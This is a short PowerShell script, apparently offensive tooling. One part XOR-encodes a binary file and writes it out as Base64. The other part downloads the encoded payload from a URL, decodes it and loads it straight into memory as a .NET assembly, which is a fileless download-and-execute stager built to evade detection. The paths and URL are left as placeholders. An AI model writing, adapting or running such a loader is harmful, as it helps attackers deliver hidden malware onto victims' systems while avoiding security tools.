$b = "[PATH TO BIN]"
$e = "[PATH TO ENCODED OUTPUT]"
$a = [System.IO.File]::ReadAllBytes($b) | ForEach-Object { $_ -bxor 42 }
[Convert]::ToBase64String($a) | Set-Content -Path $e


# $p = "C:\Users\Tamariz\Desktop\sh.txt"
# $a = Get-Content -Path $p | Out-String
$u = [URL]
$a = (New-Object System.Net.WebClient).DownloadString($u)
$b = [byte[]]([Convert]::FromBase64String($a) | ForEach-Object { $_ -bxor 42 })
[System.Reflection.Assembly]::Load($b)
